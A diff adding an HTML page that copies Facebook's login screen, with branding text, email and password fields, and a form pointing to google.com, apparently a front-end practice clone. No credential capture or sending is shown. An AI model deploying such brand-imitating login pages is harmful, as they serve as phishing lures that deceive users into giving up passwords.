@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="script.js"></script>
+</head>
+
+<body>
+  <div class="container flex">
+    <div class="facebook-page flex">
+      <div class="text">
+        <h1>facebook</h1>
+        <p>Facebook helps you connect and share</p>
+        <p>with the people in your life.</p>
+      </div>
+      <div style="display: flex; flex-wrap: wrap; justify-content: center">
+        <form action="https://google.com">
+          <input type="email" placeholder="Email address or phone number" required id="email" />
+          <input type="password" placeholder="Password" required id="password" />
+          <div class="link">
+            <button type="button" class="login" onclick="validateData()">
+              Login
+            </button>
+            <a href="#" class="forgot">Forgotten password?</a>
+          </div>
+          <hr />
+          <div class="button">
+            <a href="#">Create new account</a>
+          </div>
+        </form>
+        <p style="font-size: 0.95rem; margin-right: 0rem; padding: 2rem">
+          <a href="#">Create a Page </a>for a celebrity, brand or business.
+        </p>
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
